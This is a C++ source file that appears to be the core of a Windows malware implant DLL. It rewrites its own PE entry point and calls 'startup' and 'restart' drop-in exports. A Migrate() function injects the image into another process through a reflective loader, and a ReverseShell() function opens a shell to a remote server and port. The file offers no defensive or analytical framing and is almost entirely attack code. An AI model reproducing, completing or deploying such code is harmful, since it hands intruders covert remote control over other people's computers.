#include <cstdint>

#include "shell/sopar.h"
#include "inject/inject.h"
#include "reflect/reflect.h"
#include "apiget/export.h"

#include "external.h"

struct DllMeta_ DllMeta;

extern "C" BOOL DllMain2(void *where, size_t size);

extern "C" BOOL DllMain(void *where, size_t size)
{
    // set the metadata
    DllMeta.where = where;
    DllMeta.size  = size;
    
    // change the entry point
    struct dos_header *dh = (struct dos_header *)where;
    struct nt_header *nh = (struct nt_header *)rva_to_offset(where, dh->e_lfanew);
    nh->OptionalHeader.AddressOfEntryPoint = offset_to_rva(where, &DllMain2);
    
    DllMeta.next.info = nullptr;
    DllMeta.next.pid = (uint32_t)(uint64_t)GetCurrentProcess();
    
    // call the starup dropin
    ( (void (*)())GetExport(where, "startup") )();
    
    return TRUE;
}

extern "C" BOOL DllMain2(void *where, size_t size)
{
    // set the metadata
    DllMeta.where = where;
    DllMeta.size  = size;
    
    // call the restart dropin
    ( (void (*)())GetExport(where, "restart") )();
    
    return TRUE;
}

void Migrate()
{
    if((uint32_t)(uint64_t)GetCurrentProcess() == DllMeta.next.pid){
        return;
    }

    _InjectPid(DllMeta.where, DllMeta.size, offset_to_rva(DllMeta.where, &_ReflectiveLoad), DllMeta.next.pid);
}

void ReverseShell(const char *server, const char *port)
{
    sopar test(server, port);
    test.go();
}
